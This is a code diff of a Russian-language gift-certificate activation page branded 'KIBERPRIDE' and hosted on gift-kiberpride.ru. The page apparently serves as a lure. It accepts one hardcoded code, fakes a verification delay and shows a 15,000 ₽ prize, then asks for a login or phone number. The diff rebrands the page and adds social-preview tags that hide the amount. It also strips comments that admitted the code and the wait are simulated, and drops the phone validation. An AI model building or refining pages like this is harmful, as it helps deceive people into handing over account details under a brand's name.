@@ -3,8 +3,15 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Подарочный сертификат — активация</title>
-  <meta name="description" content="Введите код сертификата, затем логин или телефон для активации."/>
+  <title>KIBERPRIDE — активация сертификата</title>
+  <meta name="description" content="Активация подарочного сертификата. Введите код, логин или телефон."/>
+  <!-- Open Graph / Twitter (для превью без суммы) -->
+  <meta property="og:title" content="KIBERPRIDE — активация" />
+  <meta property="og:description" content="Введите код сертификата, затем логин или телефон для активации." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://gift-kiberpride.ru/" />
+  <meta property="og:image" content="https://gift-kiberpride.ru/preview.jpg" />
+
   <style>
     :root{
       --bg-blur: 8px;
@@ -35,7 +42,7 @@
     .badge.show{display:inline-flex}
     .amount{font-size:26px}
     .h1{font-size:clamp(20px,2.8vw,24px); margin:6px 0 10px; font-weight:800}
-    .p{margin:0 0 18px; color:var(--text-weak); line-height:1.55}
+    .p{margin:0 0 18px; color: var(--text-weak); line-height:1.55}
     form{display:grid; gap:12px; margin-top:10px}
     .field{display:grid; gap:6px}
     label{font-size:14px; color:var(--text-weak)}
@@ -43,8 +50,7 @@
     input:focus{border-color:var(--brand); box-shadow:0 0 0 4px rgba(27,72,240,.12)}
     .row{display:flex; gap:12px; flex-wrap:wrap}
     .row .field{flex:1 1 220px}
-    .btn{cursor:pointer; user-select:none; height:52px; border-radius:16px; border:0; font-weight:800; letter-spacing:.2px; font-size:16px;
-      background:linear-gradient(120deg, var(--accent), #ff7a70); color:#fff; box-shadow:0 12px 30px rgba(255,61,46,.35); transition: transform .06s, filter .2s;}
+    .btn{cursor:pointer; user-select:none; height:52px; border-radius:16px; border:0; font-weight:800; letter-spacing:.2px; font-size:16px; background:linear-gradient(120deg, var(--accent), #ff7a70); color:#fff; box-shadow:0 12px 30px rgba(255,61,46,.35); transition: transform .06s, filter .2s;}
     .btn:hover{filter:brightness(1.05)} .btn:active{transform:translateY(1px)} .btn[disabled]{opacity:.65; cursor:not-allowed}
     .legal{font-size:12px; color:var(--text-weak); text-align:center; padding:10px 18px 20px}
     .status{display:none; gap:10px; align-items:flex-start; border-radius:14px; padding:14px; margin-top:12px}
@@ -65,16 +71,16 @@
 <body>
   <div class="backdrop" aria-hidden="true"></div>
   <main class="page" role="main">
-    <img class="art" src="art.png" alt="Герой и надпись Подарочный сертификат" />
+    <img class="art" src="art.png" alt="Активация сертификата" />
 
     <section class="card" aria-labelledby="giftTitle">
       <header class="header">
-        <h1 id="giftTitle" class="title">Активация подарочного сертификата</h1>
+        <h1 id="giftTitle" class="title">Активация сертификата</h1>
         <p class="subtitle">Сначала укажите код сертификата, затем логин или телефон</p>
       </header>
 
       <div class="content">
-        <span id="amountBadge" class="badge" aria-label="Сумма сертификата"><span>Сумма:</span> <span class="amount">15 000 ₽</span></span>
+        <span id="amountBadge" class="badge"><span>Сумма:</span> <span class="amount">15 000 ₽</span></span>
 
         <div class="h1">Шаг 1. Код сертификата</div>
         <p class="p">Введите код формата <strong>XXXX-XXXX-XXXX-XXXX</strong>. Если пришли по персональной ссылке, поле заполнится автоматически.</p>
@@ -102,11 +108,11 @@
               </div>
               <div class="field">
                 <label for="phone">Телефон</label>
-                <input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+7 900 000-00-00" autocomplete="tel" pattern="^(\+?7|8)?\s?\(?\d{3}\)?[\s-]?\d{3}[\s-]?\d{2}[\s-]?\d{2}$" />
+                <input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+7 900 000-00-00" autocomplete="tel" />
               </div>
             </div>
-            <button class="btn" type="submit">Получить сертификат</button>
-            <div id="success" class="status ok"><div class="dot"></div><div><strong>Готово!</strong> Сертификат на <b>15 000 ₽</b> будет привязан к вашему аккаунту. Мы сообщим об активации.</div></div>
+            <button class="btn" type="submit">Активировать</button>
+            <div id="success" class="status ok"><div class="dot"></div><div><strong>Готово!</strong> Сертификат будет привязан к вашему аккаунту.</div></div>
           </form>
         </div>
       </div>
@@ -118,10 +124,8 @@
   </main>
 
   <script>
-    // Единственный рабочий код
     const VALID_CODE = 'KP-1421-DSCR-4124';
 
-    // Элементы
     const codeForm = document.getElementById('codeForm');
     const giftInput = document.getElementById('giftcode');
     const codeStatus = document.getElementById('codeStatus');
@@ -152,14 +156,14 @@
 
       setTimeout(() => {
         if (code === VALID_CODE) {
-          showStatus('ok', 'Код принят! Доступен сертификат на 15\u00A0000 \u20BD.');
+          showStatus('ok', 'Код принят!');
           amountBadge.classList.add('show');
           step2.classList.remove('hidden');
         } else {
-          showStatus('err', 'Код недействителен. Проверьте написание и попробуйте ещё раз.');
+          showStatus('err', 'Код недействителен.');
           document.getElementById('checkBtn').disabled = false;
         }
-      }, 1200); // имитация ожидания
+      }, 1200);
     });
 
     // Активация
@@ -171,10 +175,10 @@
       const loginOk = login.length >= 3;
 
       if (!phoneOk && !loginOk) {
-        alert('Укажите логин (мин. 3 символа) или корректный телефон в формате РФ.');
+        alert('Укажите логин (мин. 3 символа) или телефон.');
         return;
       }
-      console.log('Gift claim payload', { amount: 15000, currency: 'RUB', login, phone, code: VALID_CODE });
+      console.log('Gift claim payload', { login, phone, code: VALID_CODE });
       success.classList.add('show');
       actForm.querySelector('.btn').disabled = true;
       actForm.querySelector('.btn').textContent = 'Заявка отправлена';
